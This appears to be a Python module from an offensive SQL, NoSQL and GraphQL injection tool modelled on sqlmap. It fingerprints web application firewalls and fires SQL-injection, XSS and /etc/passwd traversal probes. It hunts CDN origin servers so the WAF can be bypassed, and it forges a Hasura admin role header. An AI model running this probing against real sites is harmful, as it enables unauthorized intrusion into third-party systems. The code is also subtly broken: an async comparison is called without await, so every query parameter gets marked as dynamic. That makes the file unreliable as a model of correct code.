"""
InjectIQ Probe Engine — Equivalent to sqlmap's checks.py + controller.py
Handles: endpoint discovery, WAF fingerprinting, CDN origin bypass,
parameter discovery, heuristic testing, and DBMS identification.
"""
import asyncio
import hashlib
import json
import re
import socket
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx


class EndpointType(Enum):
    SQL = "sql"
    NOSQL_MONGODB = "nosql_mongodb"
    NOSQL_REDIS = "nosql_redis"
    NOSQL_CASSANDRA = "nosql_cassandra"
    NOSQL_DYNAMODB = "nosql_dynamodb"
    NOSQL_ELASTICSEARCH = "nosql_elasticsearch"
    GRAPHQL_APOLLO = "graphql_apollo"
    GRAPHQL_HASURA = "graphql_hasura"
    GRAPHQL_GENERIC = "graphql_generic"
    UNKNOWN = "unknown"


class WAFType(Enum):
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    IMPERVA = "imperva"
    AWS_WAF = "aws_waf"
    F5_ASM = "f5_asm"
    FORTINET = "fortinet"
    BARRACUDA = "barracuda"
    MODSECURITY = "modsecurity"
    SUCURI = "sucuri"
    NONE = "none"
    UNKNOWN = "unknown"


class DBMSType(Enum):
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    MONGODB = "mongodb"
    REDIS = "redis"
    CASSANDRA = "cassandra"
    DYNAMODB = "dynamodb"
    ELASTICSEARCH = "elasticsearch"
    CLICKHOUSE = "clickhouse"
    SNOWFLAKE = "snowflake"
    UNKNOWN = "unknown"


@dataclass
class ProbeResult:
    endpoint_type: EndpointType
    waf: WAFType
    waf_confidence: float
    dbms_hint: DBMSType
    origin_ip: Optional[str]
    has_graphql: bool
    has_introspection: bool
    parameters: list[str]
    dynamic_parameters: dict[str, bool]  # param_name → is_dynamic
    baseline_response: Optional[httpx.Response]
    baseline_timing: float


class ProbeEngine:
    """Replaces sqlmap's checks.py checkConnection + checkWaf + heuristicCheckSqlInjection.
    Adds: CDN origin bypass, GraphQL detection, NoSQL detection."""

    # WAF fingerprinting — real header signatures from 2024-2026 research
    WAF_SIGNATURES = {
        WAFType.CLOUDFLARE: {
            "headers": ["cf-ray", "cf-cache-status", "server: cloudflare", "cf-Connecting-ip"],
            "block_status": [403, 503],
            "block_body": ["cloudflare", "cf-browser-verification", "ray id"],
        },
        WAFType.AKAMAI: {
            "headers": ["x-akamai-transformed", "x-akamai-session-info", "akamai"],
            "block_status": [403],
            "block_body": ["akamai", "access denied", "denied by policy"],
        },
        WAFType.IMPERVA: {
            "headers": ["x-iinfo", "x-cdn", "incap_ses", "visid_incap"],
            "block_status": [403],
            "block_body": ["imperva", "incapsula", "incident id"],
        },
        WAFType.AWS_WAF: {
            "headers": ["x-amzn-requestid", "x-amz-cf-id", "x-amzn-errortype"],
            "block_status": [403],
            "block_body": ["aws", "request id", "waf"],
        },
        WAFType.MODSECURITY: {
            "headers": ["server: apache", "x-modsecurity"],
            "block_status": [403, 406],
            "block_body": ["mod_security", "modsecurity", "not acceptable"],
        },
        WAFType.F5_ASM: {
            "headers": ["x-f5-context", "bigip"],
            "block_status": [403],
            "block_body": ["f5", "bigip", "asm"],
        },
    }

    # DBMS error signatures — like sqlmap's settings.py DBMS_ERRORS but updated
    DBMS_ERRORS = {
        DBMSType.MYSQL: [
            r"you have an error in your sql syntax",
            r"mysql_fetch",
            r"mysql_num_rows",
            r"mysql_?fetch_?array",
            r"supplied argument is not a valid mysql",
            r"warning.*mysql",
            r"valid mysql result",
            r"check the manual that (corresponds|fits) to your mysql server version",
            r"mysql server version for the right syntax",
        ],
        DBMSType.POSTGRESQL: [
            r"postgresql.*error",
            r"warning.*pg_",
            r"valid postgresql result",
            r"npgsql",
            r"unterminated quoted string at or near",
            r"psql.*error",
        ],
        DBMSType.MSSQL: [
            r"microsoft.*odbc.*sql server driver",
            r"sql server.*error",
            r"unclosed quotation mark after the character string",
            r"sqlserver.*jdbc",
            r"syntax error.*sql server",
        ],
        DBMSType.ORACLE: [
            r"ora-\d{5}",
            r"oracle.*error",
            r"oracle.*jdbc",
            r"oracle.*driver",
        ],
        DBMSType.SQLITE: [
            r"sqlite_",
            r"sqlite3::",
            r"sqlite/jdbc",
            r"near \"': syntax error",
        ],
        DBMSType.MONGODB: [
            r"mongo(db)? error",
            r"mongo(db)?exception",
            r"bson\(\)",
            r"MongoError",
            r"Mongo::Error",
        ],
        DBMSType.ELASTICSEARCH: [
            r"elasticsearch",
            r"ElasticsearchStatusException",
            r"search_phase_execution_exception",
        ],
    }

    def __init__(self, copilot_url: str = "http://localhost:11434"):
        self.copilot_url = copilot_url
        self.client = httpx.AsyncClient(
            timeout=20, verify=False, follow_redirects=False,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        )

    async def probe(self, target_url: str, method: str = "GET",
                    data: dict = None, headers: dict = None,
                    cookies: dict = None) -> ProbeResult:
        """Full probe: endpoint type → WAF → origin bypass → DBMS → parameters."""

        # Step 1: Baseline request
        start = time.time()
        baseline = await self._request(target_url, method, data, headers, cookies)
        baseline_timing = time.time() - start

        # Step 2: Detect endpoint type (SQL vs NoSQL vs GraphQL)
        endpoint_type = await self._detect_endpoint(target_url, baseline, data, headers)

        # Step 3: Fingerprint WAF
        waf, waf_conf = await self._fingerprint_waf(target_url, baseline)

        # Step 4: CDN origin bypass (BreakingWAF technique)
        origin_ip = await self._discover_origin_ip(target_url, baseline)

        # Step 5: Detect DBMS from error messages
        dbms_hint = self._detect_dbms_from_response(baseline)

        # Step 6: Discover parameters
        params = self._discover_parameters(target_url, baseline, method, data)
        dynamic = await self._test_dynamic_params(target_url, params, method, data, headers)

        # Step 7: GraphQL introspection
        has_graphql, has_introspection = False, False
        if endpoint_type in (EndpointType.GRAPHQL_APOLLO, EndpointType.GRAPHQL_HASURA,
                             EndpointType.GRAPHQL_GENERIC):
            has_graphql = True
            has_introspection = await self._test_graphql_introspection(target_url, headers)

        return ProbeResult(
            endpoint_type=endpoint_type,
            waf=waf, waf_confidence=waf_conf,
            dbms_hint=dbms_hint,
            origin_ip=origin_ip,
            has_graphql=has_graphql,
            has_introspection=has_introspection,
            parameters=list(dynamic.keys()),
            dynamic_parameters=dynamic,
            baseline_response=baseline,
            baseline_timing=baseline_timing,
        )

    async def _request(self, url, method="GET", data=None, headers=None, cookies=None):
        """Send HTTP request with proper error handling."""
        try:
            if method.upper() == "GET":
                return await self.client.get(url, params=data, headers=headers, cookies=cookies)
            elif method.upper() == "POST":
                if data and isinstance(data, dict):
                    return await self.client.post(url, json=data, headers=headers, cookies=cookies)
                return await self.client.post(url, content=data, headers=headers, cookies=cookies)
            else:
                return await self.client.request(method, url, json=data, headers=headers, cookies=cookies)
        except httpx.ConnectError:
            return None
        except httpx.TimeoutException:
            return None

    async def _detect_endpoint(self, url, baseline, data, headers) -> EndpointType:
        """Auto-detect SQL vs NoSQL vs GraphQL endpoint."""
        parsed = urlparse(url)
        path = parsed.path.lower()

        # Check path hints
        if any(x in path for x in ["/graphql", "/gql", "/query", "/api/graphql"]):
            return await self._identify_graphql_flavor(url, headers)
        if any(x in path for x in ["/api/mongo", "/api/dynamo", "/.elastic"]):
            if "mongo" in path:
                return EndpointType.NOSQL_MONGODB
            if "dynamo" in path:
                return EndpointType.NOSQL_DYNAMODB
            return EndpointType.NOSQL_ELASTICSEARCH

        # Try GraphQL introspection probe
        gql_resp = await self.client.post(
            url, json={"query": "{ __typename }"},
            headers={**({} if not headers else headers), "Content-Type": "application/json"},
        )
        if gql_resp and "__typename" in gql_resp.text:
            return await self._identify_graphql_flavor(url, headers)

        # Try NoSQL probe — send $where operator
        if data is None:
            data = {"q": "test"}
        nosql_probe = {**data, "$where": "1"}
        nosql_resp = await self.client.post(url, json=nosql_probe, headers=headers)
        if nosql_resp and any(sig in nosql_resp.text.lower() for sig in
                              ["mongo", "bson", "$where", "mongerror"]):
            return EndpointType.NOSQL_MONGODB

        # Default: SQL
        return EndpointType.SQL

    async def _identify_graphql_flavor(self, url, headers) -> EndpointType:
        """Identify Apollo vs Hasura vs generic GraphQL."""
        # Apollo federation probe
        resp = await self.client.post(
            url, json={"query": "{ _service { sdl } }"},
            headers={**({} if not headers else headers), "Content-Type": "application/json"},
        )
        if resp and "sdl" in resp.text:
            return EndpointType.GRAPHQL_APOLLO

        # Hasura probe
        resp = await self.client.post(
            url, json={"query": "{ __schema { queryType { name } } }"},
            headers={**({} if not headers else headers), "Content-Type": "application/json",
                     "X-Hasura-Role": "admin"},
        )
        if resp and "hasura" in resp.text.lower():
            return EndpointType.GRAPHQL_HASURA

        return EndpointType.GRAPHQL_GENERIC

    async def _fingerprint_waf(self, url, baseline) -> tuple[WAFType, float]:
        """Fingerprint WAF from response headers + behavior analysis.
        Like sqlmap's checkWaf but with real 2024-2026 signatures."""
        if not baseline:
            return WAFType.UNKNOWN, 0.0

        resp_headers = {k.lower(): v.lower() for k, v in baseline.headers.items()}
        resp_text = baseline.text.lower()

        # Header-based detection
        for waf_type, sigs in self.WAF_SIGNATURES.items():
            matches = 0
            total = len(sigs["headers"])
            for h_sig in sigs["headers"]:
                if ":" in h_sig:
                    key, val = h_sig.split(":", 1)
                    if key.lower() in resp_headers and val.strip().lower() in resp_headers[key.lower()]:
                        matches += 1
                elif h_sig.lower() in resp_headers:
                    matches += 1
            if matches > 0:
                confidence = matches / max(total, 1)
                return waf_type, max(confidence, 0.5)

        # Behavioral detection — send known-bad payloads
        probes = [
            ("GET", f"{url}?id=1' OR '1'='1"),
            ("GET", f"{url}?q=<script>alert(1)</script>"),
            ("GET", f"{url}?file=../../../etc/passwd"),
        ]
        for method, probe_url in probes:
            try:
                resp = await self.client.get(probe_url)
                if resp.status_code in (403, 406, 429, 503):
                    # Check which WAF produced this block
                    for waf_type, sigs in self.WAF_SIGNATURES.items():
                        if resp.status_code in sigs["block_status"]:
                            for pattern in sigs["block_body"]:
                                if pattern.lower() in resp.text.lower():
                                    return waf_type, 0.8
                    return WAFType.UNKNOWN, 0.4  # Unknown WAF detected
            except Exception:
                continue

        return WAFType.NONE, 1.0

    async def _discover_origin_ip(self, target_url: str, baseline) -> Optional[str]:
        """BreakingWAF technique — discover CDN origin IP to bypass WAF entirely.
        Based on Zafran research: 40% of Fortune 100 expose origin servers."""
        parsed = urlparse(target_url)
        domain = parsed.hostname

        # Method 1: DNS history — check if domain ever pointed to a non-CDN IP
        # (In production, use SecurityTrails/HackerTarget API)
        try:
            # Try resolving directly — if it resolves to non-CDN IP, WAF is bypassable
            addrs = socket.getaddrinfo(domain, None)
            for addr in addrs:
                ip = addr[4][0]
                if not self._is_cdn_ip(ip):
                    return ip
        except socket.gaierror:
            pass

        # Method 2: Try common origin server ports
        origin_ports = [8080, 8443, 8081, 3000, 4000, 5000, 9000]
        for port in origin_ports:
            try:
                # Build direct-to-origin URL
                origin_url = f"{parsed.scheme}://{domain}:{port}{parsed.path}"
                resp = await self.client.get(origin_url, timeout=3)
                if resp and resp.status_code == 200:
                    # Verify it's the same app by comparing content
                    if self._is_same_app(baseline, resp):
                        return f"{domain}:{port}"
            except Exception:
                continue

        # Method 3: SSL certificate search (crt.sh in production)
        # Method 4: HTTP header leaks (X-Forwarded-For, X-Original-URL)

        return None

    def _is_cdn_ip(self, ip: str) -> bool:
        """Check if IP belongs to a CDN provider's ASN."""
        # Major CDN IP ranges (simplified — production uses full ASN database)
        cdn_ranges = [
            # Cloudflare
            ("104.16.0.0", 12), ("172.64.0.0", 13), ("141.101.64.0", 18),
            # Akamai
            ("23.32.0.0", 11), ("72.246.0.0", 15), ("184.24.0.0", 14),
            # AWS
            ("52.0.0.0", 11), ("54.0.0.0", 8), ("3.0.0.0", 8),
        ]
        import ipaddress
        try:
            addr = ipaddress.ip_address(ip)
            for net_addr, prefix in cdn_ranges:
                if addr in ipaddress.ip_network(f"{net_addr}/{prefix}"):
                    return True
        except ValueError:
            pass
        return False

    def _is_same_app(self, resp1, resp2) -> bool:
        """Compare two responses to verify same application."""
        if not resp1 or not resp2:
            return False
        # Compare title tag
        title1 = re.search(r"<title>(.*?)</title>", resp1.text, re.I | re.S)
        title2 = re.search(r"<title>(.*?)</title>", resp2.text, re.I | re.S)
        if title1 and title2 and title1.group(1).strip() == title2.group(1).strip():
            return True
        # Compare content length similarity
        if abs(len(resp1.text) - len(resp2.text)) / max(len(resp1.text), 1) < 0.3:
            return True
        return False

    def _detect_dbms_from_response(self, response) -> DBMSType:
        """Like sqlmap's heuristicCheckDbms — identify DBMS from error messages."""
        if not response:
            return DBMSType.UNKNOWN
        text = response.text
        for dbms, patterns in self.DBMS_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, text, re.I):
                    return dbms
        return DBMSType.UNKNOWN

    def _discover_parameters(self, url, baseline, method, data) -> list[str]:
        """Discover injectable parameters from URL, form data, and headers."""
        params = []
        parsed = urlparse(url)
        # URL query parameters
        qs = parse_qs(parsed.query)
        params.extend(qs.keys())
        # POST body parameters
        if data and isinstance(data, dict):
            params.extend(data.keys())
        # Common header injection points
        params.extend(["User-Agent", "Referer", "X-Forwarded-For", "Cookie"])
        return list(dict.fromkeys(params))  # deduplicate

    async def _test_dynamic_params(self, url, params, method, data, headers) -> dict[str, bool]:
        """Like sqlmap's checkDynParam — test which parameters affect response."""
        dynamic = {}
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)

        for param in params:
            if param in qs:
                # Test by changing URL parameter value
                original_val = qs[param][0]
                test_val = original_val + "9999"  # Append unlikely value
                test_qs = {**qs, param: [test_val]}
                test_url = urlunparse(parsed._replace(query=urlencode(test_qs, doseq=True)))

                resp = await self._request(test_url, "GET", None, headers)
                if resp and self.baseline_differs(baseline=None, test_resp=resp, url=url, headers=headers):
                    dynamic[param] = True
                else:
                    dynamic[param] = False
            elif param in ("User-Agent", "Referer", "X-Forwarded-For", "Cookie"):
                dynamic[param] = False  # Header params tested separately
            else:
                dynamic[param] = True  # POST params assumed dynamic

        return dynamic

    async def baseline_differs(self, baseline, test_resp, url, headers) -> bool:
        """Compare test response against baseline."""
        baseline_resp = await self._request(url, "GET", None, headers)
        if not baseline_resp or not test_resp:
            return False
        # Content length difference > 10% indicates dynamic
        if abs(len(baseline_resp.text) - len(test_resp.text)) > len(baseline_resp.text) * 0.1:
            return True
        # Status code difference
        if baseline_resp.status_code != test_resp.status_code:
            return True
        return False

    async def _test_graphql_introspection(self, url, headers) -> bool:
        """Test if GraphQL introspection is enabled."""
        query = "{ __schema { types { name } } }"
        try:
            resp = await self.client.post(
                url, json={"query": query},
                headers={**({} if not headers else headers), "Content-Type": "application/json"},
            )
            if resp and "__schema" in resp.text and "types" in resp.text:
                return True
        except Exception:
            pass
        return False
